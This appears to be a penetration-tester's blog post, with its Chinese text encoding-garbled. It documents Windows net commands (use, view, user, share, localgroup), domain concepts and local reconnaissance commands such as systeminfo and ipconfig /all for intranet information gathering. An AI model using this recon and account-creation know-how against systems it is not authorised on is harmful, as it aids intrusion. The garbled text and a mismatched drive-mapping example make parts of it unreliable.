<p>â‘¢è¯»å–å’Œè¿è¡Œï¼ˆRead &amp; Executeï¼‰ï¼š è¯¥æƒé™å…è®¸ç”¨æˆ·æ‹¥æœ‰è¯»å–å’Œåˆ—å‡ºèµ„æºç›®å½•çš„æƒé™ï¼Œå¦å¤–ä¹Ÿå…è®¸ç”¨æˆ·åœ¨èµ„æºä¸­è¿›è¡Œç§»åŠ¨å’Œéå†ï¼Œè¿™ä½¿å¾—ç”¨æˆ·èƒ½å¤Ÿç›´æ¥è®¿é—®å­æ–‡ä»¶å¤¹ä¸æ–‡ä»¶ï¼Œå³ä½¿ç”¨æˆ·æ²¡æœ‰æƒé™è®¿é—®è¿™ä¸ªè·¯å¾„ï¼›</p>
<p>â‘£åˆ—å‡ºæ–‡ä»¶å¤¹ç›®å½•ï¼ˆList Folder Contentsï¼‰ï¼š è¯¥æƒé™å…è®¸ç”¨æˆ·æŸ¥çœ‹èµ„æºä¸­çš„å­æ–‡ä»¶å¤¹ä¸æ–‡ä»¶åç§°ï¼›</p>
<p>â‘¤è¯»å–ï¼ˆReadï¼‰ï¼š è¯¥æƒé™å…è®¸ç”¨æˆ·æŸ¥çœ‹è¯¥æ–‡ä»¶å¤¹ä¸­çš„æ–‡ä»¶ä»¥åŠå­æ–‡ä»¶å¤¹ï¼Œä¹Ÿå…è®¸æŸ¥çœ‹è¯¥æ–‡ä»¶å¤¹çš„å±æ€§ã€æ‰€æœ‰è€…å’Œæ‹¥æœ‰çš„æƒé™ç­‰ï¼›</p>
<p>â‘¥å†™å…¥ï¼ˆWriteï¼‰ï¼š è¯¥æƒé™å…è®¸ç”¨æˆ·åœ¨è¯¥æ–‡ä»¶å¤¹ä¸­åˆ›å»ºæ–°çš„æ–‡ä»¶å’Œå­æ–‡ä»¶å¤¹ï¼Œä¹Ÿå¯ä»¥æ”¹å˜æ–‡ä»¶å¤¹çš„å±æ€§ã€æŸ¥çœ‹æ–‡ä»¶å¤¹çš„æ‰€æœ‰è€…å’Œæƒé™ç­‰ã€‚</p>
</blockquote>
<p><a href="https://paper.seebug.org/17/" target="_blank" rel="noopener">https://paper.seebug.org/17/</a></p>
<h1 id="net-ç³»åˆ—å‘½ä»¤"><a href="#net-ç³»åˆ—å‘½ä»¤" class="headerlink" title="net ç³»åˆ—å‘½ä»¤"></a>net ç³»åˆ—å‘½ä»¤</h1><h2 id="net-use"><a href="#net-use" class="headerlink" title="net use"></a>net use</h2><blockquote>
<p>Connects a computer to or disconnects a computer from a shared resource, or displays information about computer connections. The command also controls persistent net connections. Used without parameters, <strong>net use</strong> retrieves a list of network connections.</p>
<p>å°†è®¡ç®—æœºè¿æ¥åˆ°å…±äº«èµ„æºæˆ–å°†å…¶ä¸å…±äº«èµ„æºæ–­å¼€è¿æ¥ï¼Œæˆ–æ˜¾ç¤ºæœ‰å…³è®¡ç®—æœºè¿æ¥çš„ä¿¡æ¯ã€‚ è¯¥å‘½ä»¤è¿˜æ§åˆ¶æŒä¹…çš„ç½‘ç»œè¿æ¥ã€‚ å¦‚æœä¸å¸¦å‚æ•°ä½¿ç”¨ï¼Œnet useä¼šæ£€ç´¢ç½‘ç»œè¿æ¥åˆ—è¡¨ã€‚</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">net use [&#123;&lt;DeviceName&gt; | *&#125;] [\\&lt;ComputerName&gt;\&lt;ShareName&gt;[\&lt;volume&gt;]] [&#123;&lt;Password&gt; | *&#125;]] [/user:[&lt;DomainName&gt;\]&lt;UserName] &gt;[/user:[&lt;DottedDomainName&gt;\]&lt;UserName&gt;] [/user: [&lt;UserName@DottedDomainName&gt;] [/savecred] [/smartcard] [&#123;/<span class="keyword">delete</span> | /persistent:&#123;yes | no&#125;&#125;]</span><br><span class="line">net use [&lt;DeviceName&gt; [/<span class="built_in">home</span>[&#123;&lt;Password&gt; | *&#125;] [/<span class="keyword">delete</span>:&#123;yes | no&#125;]]</span><br><span class="line">net use [/persistent:&#123;yes | no&#125;]</span><br></pre></td></tr></table></figure>

<p>eg:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¦å°†ç£ç›˜é©±åŠ¨å™¨è®¾å¤‡åç§°Eï¼šåˆ†é…ç»™\\FinancialæœåŠ¡å™¨ä¸Šçš„Letterså…±äº«ç›®å½•ï¼Œè¯·é”®å…¥ï¼š</span><br><span class="line">net use e: \\financial\letters</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¦å°†ç£ç›˜é©±åŠ¨å™¨è®¾å¤‡åç§°Mï¼šåˆ†é…ï¼ˆæ˜ å°„ï¼‰åˆ°\\FinancialæœåŠ¡å™¨ä¸Šçš„Letterså·ä¸­çš„ç›®å½•User2ï¼Œè¯·é”®å…¥ï¼š</span><br><span class="line">net use e: \\financial\letters</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¦è¿æ¥ç”¨æˆ·æ ‡è¯†ç¬¦User1ï¼Œå°±åƒä»å¸æˆ·åŸŸä¸­å»ºç«‹è¿æ¥ä¸€æ ·ï¼Œè¯·é”®å…¥</span><br><span class="line">net use d:\\server\share &#x2F;user:Accounts\User1</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¦ä»\\Financial\Publicç›®å½•æ–­å¼€è¿æ¥ï¼Œè¯·é”®å…¥ï¼š</span><br><span class="line">net use f: \\financial\public &#x2F;delete</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¦è¿æ¥åˆ°\\Financial 2æœåŠ¡å™¨ä¸Šå…±äº«çš„èµ„æºå¤‡å¿˜å½•ï¼Œè¯·é”®å…¥ï¼š</span><br><span class="line">net use k: &quot;\\financial 2&quot; \memos</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¦æ¢å¤æ¯æ¬¡ç™»å½•æ—¶çš„å½“å‰è¿æ¥ï¼Œè€Œä¸è€ƒè™‘å°†æ¥çš„æ›´æ”¹ï¼Œè¯·é”®å…¥ï¼š</span><br><span class="line">net use &#x2F;persistent:yes</span><br></pre></td></tr></table></figure>

<h2 id="net-view"><a href="#net-view" class="headerlink" title="net view"></a>net view</h2><blockquote>
<p>Displays a list of domains, computers, or resources that are being shared by the specified computer. Used without parameters, <strong>net view</strong> displays a list of computers in your current domain.</p>
<p>æ˜¾ç¤ºæŒ‡å®šè®¡ç®—æœºæ­£åœ¨å…±äº«çš„åŸŸã€è®¡ç®—æœºæˆ–èµ„æºçš„åˆ—è¡¨ã€‚åœ¨æ²¡æœ‰å‚æ•°çš„æƒ…å†µä¸‹ä½¿ç”¨ï¼Œnet viewå°†æ˜¾ç¤ºå½“å‰åŸŸä¸­çš„è®¡ç®—æœºåˆ—è¡¨ã€‚</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">net view [\\ComputerName [/CACHE] | [/ALL] | /DOMAIN[:DomainName]]</span><br></pre></td></tr></table></figure>

<p>eg:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Use the net view command to display a list of computers. The output is similar to the following:</span><br><span class="line"></span><br><span class="line">Server Name           Remark</span><br><span class="line">-------------------------------------------------</span><br><span class="line">\\Production          Production file server</span><br><span class="line">\\Print1              Printer room, first floor</span><br><span class="line">\\Print2              Printer room, second floor</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">To see a list of the resources shared by the \\Production computer, type:</span><br><span class="line">net view \\production</span><br><span class="line"></span><br><span class="line">To see a list of the computers in the sales domain or workgroup, type:</span><br><span class="line">net view &#x2F;domain:sales</span><br></pre></td></tr></table></figure>

<h2 id="net-user"><a href="#net-user" class="headerlink" title="net user"></a>net user</h2><blockquote>
<p>Adds or modifies user accounts, or displays user account information.</p>
<p><strong>Net user</strong> is a command-line tool that is built into Windows Vista. To run <strong>net user</strong>, open a command prompt, type <strong>net user</strong> with the appropriate parameters, and then press ENTER.</p>
<p>æ·»åŠ æˆ–ä¿®æ”¹ç”¨æˆ·å¸æˆ·ï¼Œæˆ–æ˜¾ç¤ºç”¨æˆ·å¸æˆ·ä¿¡æ¯ã€‚</p>
<p><strong>Net user</strong>æ˜¯Windows Vistaä¸­å†…ç½®çš„å‘½ä»¤è¡Œå·¥å…·ã€‚ è‹¥è¦è¿è¡Œnet userï¼Œè¯·æ‰“å¼€å‘½ä»¤æç¤ºç¬¦ï¼Œé”®å…¥å…·æœ‰é€‚å½“å‚æ•°çš„net userï¼Œç„¶åæŒ‰Enterã€‚</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">net user [&lt;UserName&gt; &#123;&lt;Password&gt; | *&#125; [&lt;Options&gt;]] [/domain]</span><br><span class="line">net user [&lt;UserName&gt; &#123;&lt;Password&gt; | *&#125; /add [&lt;Options&gt;] [/domain]]</span><br><span class="line">net user [&lt;UserName&gt; [/<span class="keyword">delete</span>] [/domain]]</span><br></pre></td></tr></table></figure>

<p>eg:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ä¸‹é¢çš„ç¤ºä¾‹æ˜¾ç¤ºæœ¬åœ°è®¡ç®—æœºçš„æ‰€æœ‰ç”¨æˆ·å¸æˆ·çš„åˆ—è¡¨ï¼š</span><br><span class="line">net user</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ä»¥ä¸‹ç¤ºä¾‹æ˜¾ç¤ºæœ‰å…³ç”¨æˆ·å¸æˆ·tommyhçš„ä¿¡æ¯ï¼š</span><br><span class="line">net user tommyh</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ä»¥ä¸‹ç¤ºä¾‹ä¸ºå…¨åæ˜¯Jay Jamisonï¼Œç”¨æˆ·å¸æˆ·åæ˜¯jayjçš„ç”¨æˆ·æ·»åŠ äº†ä¸€ä¸ªç”¨æˆ·å¸æˆ·ï¼Œå…¶ç™»å½•æƒé™ä¸ºä¸Šåˆ8ç‚¹ã€‚å‘¨ä¸€è‡³å‘¨äº”ä¸‹åˆ5ç‚¹ï¼ˆæ—¶é—´æŒ‡å®šä¸­æ²¡æœ‰ç©ºæ ¼ï¼‰ï¼Œå¼ºåˆ¶æ€§å¯†ç ï¼ˆCyk4^g3Bï¼‰å’Œç”¨æˆ·çš„å…¨åï¼š</span><br><span class="line">net user jayj Cyk4^g3B &#x2F;add &#x2F;passwordreq:yes &#x2F;times:monday-friday,8am-5pm &#x2F;fullname:&quot;Jay Jamison&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ä¸‹é¢çš„ç¤ºä¾‹ä½¿ç”¨24å°æ—¶è¡¨ç¤ºæ³•è®¾ç½®ç”¨äºç™»å½•çš„ç™»å½•æ—¶é—´ï¼ˆä¸Šåˆ8ç‚¹åˆ°ä¸‹åˆ5ç‚¹ï¼‰ï¼š</span><br><span class="line">net user miked &#x2F;time:M-F,8AM-5PM</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ä¸‹é¢çš„ç¤ºä¾‹æŒ‡å®šäº†ç™»å½•æ—¶é—´:å‘¨ä¸€ä»ä¸Šåˆ4ç‚¹åˆ°ä¸‹åˆ5ç‚¹ï¼Œå‘¨äºŒä»ä¸‹åˆ1ç‚¹åˆ°ä¸‹åˆ3ç‚¹ï¼Œå‘¨ä¸‰åˆ°å‘¨äº”ä»ä¸Šåˆ8ç‚¹åˆ°ä¸‹åˆ5ç‚¹</span><br><span class="line">net user anibals &#x2F;time:M,4AM-5PM;T,1PM-3PM;W-F,8:00-17:00</span><br></pre></td></tr></table></figure>

<h2 id="net-share"><a href="#net-share" class="headerlink" title="net share"></a>net share</h2><blockquote>
<p>Manages shared resources. Used without parameters, <strong>net share</strong> displays information about all of the resources that are shared on the local computer. For each resource, the device name(s) or pathname(s) and a descriptive comment are displayed.</p>
<p>ç®¡ç†å…±äº«èµ„æºã€‚ ä½¿ç”¨ä¸å¸¦å‚æ•°çš„net shareå¯ä»¥æ˜¾ç¤ºæœ‰å…³åœ¨æœ¬åœ°è®¡ç®—æœºä¸Šå…±äº«çš„æ‰€æœ‰èµ„æºçš„ä¿¡æ¯ã€‚ å¯¹äºæ¯ä¸ªèµ„æºï¼Œå°†æ˜¾ç¤ºè®¾å¤‡åç§°æˆ–è·¯å¾„åç§°ä»¥åŠæè¿°æ€§æ³¨é‡Šã€‚</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net share &lt;ShareName&gt;</span><br><span class="line">net share &lt;ShareName&gt;&#x3D;&lt;drive&gt;:&lt;DirectoryPath&gt; [&#x2F;grant:&lt;user&gt;,&#123;read | change |full&#125;] [&#x2F;users:&lt;number&gt; | &#x2F;unlimited] [&#x2F;remark:&lt;text&gt;] [&#x2F;cache:&#123;manual | documents | programs | BranchCache |none&#125; ]</span><br><span class="line">net share [&#x2F;users:&lt;number&gt; | &#x2F;unlimited] [&#x2F;remark:&lt;text&gt;] [&#x2F;cache:&#123;manual | documents | programs | BranchCache |none&#125; ]</span><br><span class="line">net share &#123;&lt;ShareName&gt; | &lt;DeviceName&gt; | &lt;drive&gt;:&lt;DirectoryPath&gt;&#125; &#x2F;delete</span><br><span class="line">net share &lt;ShareName&gt; \\&lt;ComputerName&gt; &#x2F;delete</span><br></pre></td></tr></table></figure>

<h2 id="net-localgroup"><a href="#net-localgroup" class="headerlink" title="net localgroup"></a>net localgroup</h2><blockquote>
<p>Adds, displays, or modifies local groups. Used without parameters, <strong>net localgroup</strong> displays the name of the server and the names of local groups on the computer.</p>
<p>æ·»åŠ ï¼Œæ˜¾ç¤ºæˆ–ä¿®æ”¹æœ¬åœ°ç»„ã€‚ ä½¿ç”¨ä¸å¸¦å‚æ•°çš„net localgroupå¯ä»¥æ˜¾ç¤ºæœåŠ¡å™¨çš„åç§°å’Œè®¡ç®—æœºä¸Šçš„æœ¬åœ°ç»„çš„åç§°ã€‚</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net localgroup [&lt;GroupName&gt; [&#x2F;comment:&quot;&lt;Text&gt;&quot;]] [&#x2F;domain]</span><br><span class="line">net localgroup [&lt;GroupName&gt; &#123;&#x2F;add [&#x2F;comment:&quot;&lt;Text&gt;&quot;] | &#x2F;delete&#125; [&#x2F;domain]</span><br><span class="line">net localgroup [&lt;GroupName&gt; &lt;Name&gt; [â€¦] &#123;&#x2F;add |  &#x2F;delete&#125; [&#x2F;domain]</span><br></pre></td></tr></table></figure>

<p>res</p>
<p><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012</a></p>
<blockquote>
<p>ä»¥ä¸‹å‚è€ƒ</p>
<p><a href="https://xz.aliyun.com/t/7663" target="_blank" rel="noopener">https://xz.aliyun.com/t/7663</a></p>
<p><a href="https://wh0ale.github.io/2018/12/19/2018-12-19-åŸŸæ¸—é€/" target="_blank" rel="noopener">https://wh0ale.github.io/2018/12/19/2018-12-19-%E5%9F%9F%E6%B8%97%E9%80%8F/</a></p>
<p><a href="https://www.cnblogs.com/leixiao-/p/10578809.htmlç¯å¢ƒæ­å»ºä»‹ç»çš„è¾ƒå…¨é¢" target="_blank" rel="noopener">https://www.cnblogs.com/leixiao-/p/10578809.htmlç¯å¢ƒæ­å»ºä»‹ç»çš„è¾ƒå…¨é¢</a></p>
</blockquote>
<h1 id="å†…ç½‘æ¸—é€ä¿¡æ¯æ”¶é›†"><a href="#å†…ç½‘æ¸—é€ä¿¡æ¯æ”¶é›†" class="headerlink" title="å†…ç½‘æ¸—é€ä¿¡æ¯æ”¶é›†"></a>å†…ç½‘æ¸—é€ä¿¡æ¯æ”¶é›†</h1><blockquote>
<h1 id="å†…ç½‘å’ŒåŸŸ"><a href="#å†…ç½‘å’ŒåŸŸ" class="headerlink" title="å†…ç½‘å’ŒåŸŸ"></a>å†…ç½‘å’ŒåŸŸ</h1><h2 id="å†…ç½‘"><a href="#å†…ç½‘" class="headerlink" title="å†…ç½‘"></a>å†…ç½‘</h2><p>å±€åŸŸç½‘ï¼ˆLocal Area Networkï¼ŒLANï¼‰æ˜¯æŒ‡åœ¨æŸä¸€åŒºåŸŸå†…ç”±å¤šå°è®¡ç®—æœºäº’è”æˆçš„è®¡ç®—æœºç»„ã€‚ä¸€èˆ¬æ˜¯æ–¹åœ†å‡ åƒç±³ä»¥å†…ã€‚å±€åŸŸç½‘å¯ä»¥å®ç°æ–‡ä»¶ç®¡ç†ã€åº”ç”¨è½¯ä»¶å…±äº«ã€æ‰“å°æœºå…±äº«ã€å·¥ä½œç»„å†…çš„æ—¥ç¨‹å®‰æ’ã€ç”µå­é‚®ä»¶å’Œä¼ çœŸé€šä¿¡æœåŠ¡ç­‰åŠŸèƒ½ã€‚å±€åŸŸç½‘æ˜¯å°é—­å‹çš„ï¼Œå¯ä»¥ç”±åŠå…¬å®¤å†…çš„ä¸¤å°è®¡ç®—æœºç»„æˆï¼Œä¹Ÿå¯ä»¥ç”±ä¸€ä¸ªå…¬å¸å†…çš„ä¸Šåƒå°è®¡ç®—æœºç»„æˆã€‚</p>
<h2 id="åŸŸ"><a href="#åŸŸ" class="headerlink" title="åŸŸ"></a>åŸŸ</h2><p>åŸŸï¼ˆDomainï¼‰æ˜¯ç›¸å¯¹å·¥ä½œç»„ï¼ˆWorkgroupï¼‰çš„æ¦‚å¿µï¼Œå½¢è±¡çš„è¯´ï¼ŒåŸŸå°±åƒä¸­å¤®é›†æƒï¼Œç”±ä¸€å°æˆ–æ•°å°åŸŸæ§åˆ¶å™¨ï¼ˆDomain Controllerï¼‰ç®¡ç†åŸŸå†…çš„å…¶ä»–è®¡ç®—æœºï¼›å·¥ä½œç»„å°±åƒå„è‡ªä¸ºæ”¿ï¼Œç»„å†…æ¯ä¸€å°è®¡ç®—æœºè‡ªå·±ç®¡ç†è‡ªå·±ï¼Œä»–äººæ— æ³•å¹²æ¶‰ã€‚</p>
<p>åŸŸæ˜¯ä¸€ä¸ªè®¡ç®—æœºç¾¤ä½“çš„ç»„åˆï¼Œæ˜¯ä¸€ä¸ªç›¸å¯¹ä¸¥æ ¼çš„ç»„ç»‡ï¼Œè€ŒåŸŸæ§åˆ¶å™¨åˆ™æ˜¯è¿™ä¸ªåŸŸå†…çš„ç®¡ç†æ ¸å¿ƒã€‚</p>
<p>åŸŸæ§åˆ¶å™¨å¯ä»¥å¯¹åŸŸå†…è®¡ç®—æœºè¿›è¡Œé›†ä¸­ç®¡ç†ï¼Œæ¯”å¦‚åœ¨åŸŸæ§åˆ¶å™¨ä¸Šå¯ä»¥å®šä¹‰æ‰€æœ‰ç”¨æˆ·ä¸èƒ½æ›´æ”¹æ¡Œé¢ï¼Œæˆ–è€…æ‰€æœ‰ç”¨æˆ·çš„å¯†ç é•¿åº¦å¿…é¡»8ä½ä»¥ä¸Šï¼Œè€Œå·¥ä½œç»„ç¯å¢ƒçš„è®¡ç®—æœºåˆ™æ— æ³•åšåˆ°è¿™äº›ã€‚</p>
<p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒåŸŸæ§åˆ¶å™¨é›†æˆäº†DNSæœåŠ¡ï¼Œå¯ä»¥è§£æåŸŸå†…çš„è®¡ç®—æœºåç§°ï¼ˆåŸºäºTCP/IPï¼‰ï¼Œè§£å†³äº†å·¥ä½œç»„ç¯å¢ƒä¸åŒç½‘æ®µè®¡ç®—æœºä¸èƒ½ä½¿ç”¨è®¡ç®—æœºåäº’è®¿çš„é—®é¢˜ã€‚</p>
<ul>
<li>åŸŸ(Domain)æ˜¯Windowsç½‘ç»œä¸­ç‹¬ç«‹è¿è¡Œçš„å•ä½ï¼ŒåŸŸä¹‹é—´ç›¸äº’è®¿é—®åˆ™éœ€è¦å»ºç«‹ä¿¡ä»»å…³ç³»(å³Trust Relation)ã€‚ä¿¡ä»»å…³ç³»æ˜¯è¿æ¥åœ¨åŸŸä¸åŸŸä¹‹é—´çš„æ¡¥æ¢ã€‚å½“ä¸€ä¸ªåŸŸä¸å…¶ä»–åŸŸå»ºç«‹äº†ä¿¡ä»»å…³ç³»åï¼Œ 2ä¸ªåŸŸä¹‹é—´ä¸ä½†å¯ä»¥æŒ‰éœ€è¦ç›¸äº’è¿›è¡Œç®¡ç†ï¼Œè¿˜å¯ä»¥è·¨ç½‘åˆ†é…æ–‡ä»¶å’Œæ‰“å°æœºç­‰è®¾å¤‡èµ„æºï¼Œä½¿ä¸åŒçš„åŸŸä¹‹é—´å®ç°ç½‘ç»œèµ„æºçš„å…±äº«ä¸ç®¡ç†ã€‚ ã€€ã€€ â€“ åŸŸæ—¢æ˜¯ Windows ç½‘ç»œæ“ä½œç³»ç»Ÿçš„é€»è¾‘ç»„ç»‡å•å…ƒï¼Œä¹Ÿæ˜¯Internetçš„é€»è¾‘ç»„ç»‡å•å…ƒï¼Œåœ¨ Windows ç½‘ç»œæ“ä½œç³»ç»Ÿä¸­ï¼ŒåŸŸæ˜¯å®‰å…¨è¾¹ç•Œã€‚åŸŸç®¡ç†å‘˜åªèƒ½ç®¡ç†åŸŸçš„å†…éƒ¨ï¼Œé™¤éå…¶ä»–çš„åŸŸæ˜¾å¼åœ°èµ‹äºˆä»–ç®¡ç†æƒé™ï¼Œä»–æ‰èƒ½å¤Ÿè®¿é—®æˆ–è€…ç®¡ç†å…¶ä»–çš„åŸŸ;æ¯ä¸ªåŸŸéƒ½æœ‰è‡ªå·±çš„å®‰å…¨ç­–ç•¥ï¼Œä»¥åŠå®ƒä¸å…¶ä»–åŸŸçš„å®‰å…¨ä¿¡ä»»å…³ç³»ã€‚ â€“ åŸŸï¼šåŸŸæ˜¯ä¸€ç§ç®¡ç†è¾¹ç•Œï¼Œç”¨äºä¸€ç»„è®¡ç®—æœºå…±äº«å…±ç”¨çš„å®‰å…¨æ•°æ®åº“ï¼ŒåŸŸå®é™…ä¸Šå°±æ˜¯ä¸€ç»„æœåŠ¡å™¨å’Œå·¥ä½œç«™çš„é›†åˆã€‚</li>
</ul>
<blockquote>
<p>åŸŸå’ŒåŸŸä¹‹é—´å¯ä»¥é€šè¿‡VPNç­‰è®¾å¤‡è¿›è¡Œè¿æ¥ï¼Œå¹¶å»ºç«‹ä»å±å’Œå¹³è¡Œçš„åŸŸå…³ç³»</p>
</blockquote>
<h2 id="åŸŸã€å·¥ä½œç»„ã€å®¶åº­ç»„"><a href="#åŸŸã€å·¥ä½œç»„ã€å®¶åº­ç»„" class="headerlink" title="åŸŸã€å·¥ä½œç»„ã€å®¶åº­ç»„"></a>åŸŸã€å·¥ä½œç»„ã€å®¶åº­ç»„</h2><p><strong>å·¥ä½œç»„:</strong></p>
<ul>
<li>æ‰€æœ‰çš„è®¡ç®—æœºéƒ½æ˜¯å¯¹ç­‰çš„ï¼Œæ²¡æœ‰è®¡ç®—æœºå¯ä»¥æ§åˆ¶å¦ä¸€å°è®¡ç®—æœºã€‚æ¯å°è®¡ç®—æœºéƒ½å…·æœ‰ä¸€ç»„ç”¨æˆ·å¸æˆ·ã€‚è‹¥è¦ç™»å½•åˆ°å·¥ä½œç»„ä¸­çš„ä»»ä½•è®¡ç®—æœºï¼Œæ‚¨å¿…é¡»å…·æœ‰è¯¥è®¡ç®—æœºä¸Šçš„å¸æˆ·ã€‚</li>
<li>é€šå¸¸æƒ…å†µä¸‹ï¼Œè®¡ç®—æœºçš„æ•°é‡ä¸è¶…è¿‡äºŒåå°ã€‚</li>
<li>å·¥ä½œç»„ä¸å—å¯†ç ä¿æŠ¤ã€‚</li>
<li>æ‰€æœ‰çš„è®¡ç®—æœºå¿…é¡»åœ¨åŒä¸€æœ¬åœ°ç½‘ç»œæˆ–å­ç½‘ä¸­ã€‚</li>
</ul>
<p><strong>å®¶åº­ç»„ï¼š</strong></p>
<ul>
<li>å®¶åº­ç½‘ç»œä¸­çš„è®¡ç®—æœºå¿…é¡»å±äºæŸä¸ªå·¥ä½œç»„ï¼Œä½†å®ƒä»¬ä¹Ÿå¯ä»¥å±äºæŸä¸ªå®¶åº­ç»„ã€‚ä½¿ç”¨å®¶åº­ç»„ï¼Œå¯è½»æ¾ä¸å®¶åº­ç½‘ç»œä¸­çš„å…¶ä»–äººå…±äº«å›¾ç‰‡ã€éŸ³ä¹ã€è§†é¢‘ã€æ–‡æ¡£å’Œæ‰“å°æœºã€‚</li>
<li>å®¶åº­ç»„å—å¯†ç ä¿æŠ¤ï¼Œä½†åœ¨å°†è®¡ç®—æœºæ·»åŠ åˆ°å®¶åº­ç»„æ—¶ï¼Œåªéœ€è¦é”®å…¥ä¸€æ¬¡å¯†ç å³å¯ã€‚</li>
</ul>
<p><strong>åŸŸï¼š</strong></p>
<ul>
<li>æœ‰ä¸€å°æˆ–å¤šå°è®¡ç®—æœºä¸ºæœåŠ¡å™¨ã€‚ç½‘ç»œç®¡ç†å‘˜ä½¿ç”¨æœåŠ¡å™¨æ§åˆ¶åŸŸä¸­æ‰€æœ‰è®¡ç®—æœºçš„å®‰å…¨å’Œæƒé™ã€‚è¿™ä½¿å¾—æ›´å®¹æ˜“è¿›è¡Œæ›´æ”¹ï¼Œå› ä¸ºæ›´æ”¹ä¼šè‡ªåŠ¨åº”ç”¨åˆ°æ‰€æœ‰çš„è®¡ç®—æœºã€‚åŸŸç”¨æˆ·åœ¨æ¯æ¬¡è®¿é—®åŸŸæ—¶å¿…é¡»æä¾›å¯†ç æˆ–å…¶ä»–å‡­æ®ã€‚</li>
<li>å¦‚æœå…·æœ‰åŸŸä¸Šçš„ç”¨æˆ·å¸æˆ·ï¼Œæ‚¨å°±å¯ä»¥ç™»å½•åˆ°åŸŸä¸­çš„ä»»ä½•è®¡ç®—æœºï¼Œè€Œæ— éœ€å…·æœ‰è¯¥è®¡ç®—æœºä¸Šçš„å¸æˆ·ã€‚ ç”±äºç½‘ç»œç®¡ç†å‘˜ç»å¸¸è¦ç¡®ä¿è®¡ç®—æœºä¹‹é—´çš„ä¸€è‡´æ€§ï¼Œæ‰€ä»¥ï¼Œæ‚¨ä¹Ÿè®¸åªèƒ½å¯¹è®¡ç®—æœºçš„è®¾ç½®è¿›è¡Œæœ‰é™åˆ¶åœ°æ›´æ”¹ã€‚</li>
<li>ä¸€ä¸ªåŸŸä¸­å¯ä»¥æœ‰å‡ åƒå°è®¡ç®—æœºã€‚</li>
<li>è®¡ç®—æœºå¯ä»¥ä½äºä¸åŒçš„æœ¬åœ°ç½‘ç»œä¸­ã€‚</li>
</ul>
</blockquote>
<h2 id="ç³»ç»Ÿç¯å¢ƒå˜é‡"><a href="#ç³»ç»Ÿç¯å¢ƒå˜é‡" class="headerlink" title="ç³»ç»Ÿç¯å¢ƒå˜é‡"></a>ç³»ç»Ÿç¯å¢ƒå˜é‡</h2><ul>
<li>set</li>
</ul>
<p><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505134836878.png" alt="image-20200505134836878"></p>
<h2 id="æœ¬æœºç½‘ç»œé…ç½®"><a href="#æœ¬æœºç½‘ç»œé…ç½®" class="headerlink" title="æœ¬æœºç½‘ç»œé…ç½®"></a>æœ¬æœºç½‘ç»œé…ç½®</h2><ul>
<li>ipconfig /all</li>
</ul>
<p><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505084641489.png" alt="image-20200505084641489"></p>
<h2 id="æ“ä½œç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯ã€è¡¥ä¸ä¿¡æ¯ç­‰"><a href="#æ“ä½œç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯ã€è¡¥ä¸ä¿¡æ¯ç­‰" class="headerlink" title="æ“ä½œç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯ã€è¡¥ä¸ä¿¡æ¯ç­‰"></a>æ“ä½œç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯ã€è¡¥ä¸ä¿¡æ¯ç­‰</h2><ul>
<li>systeminfo</li>
</ul>
<p><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505084846446.png" alt="image-20200505084846446"></p>
<h2 id="æŸ¥è¯¢ç³»ç»Ÿä½“ç³»æ¶æ„"><a href="#æŸ¥è¯¢ç³»ç»Ÿä½“ç³»æ¶æ„" class="headerlink" title="æŸ¥è¯¢ç³»ç»Ÿä½“ç³»æ¶æ„"></a>æŸ¥è¯¢ç³»ç»Ÿä½“ç³»æ¶æ„</h2><ul>
<li>echo %PROCESSOR_ARCHITECTURE%</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505085233818.png" alt="image-20200505085233818" style="zoom:200%;">

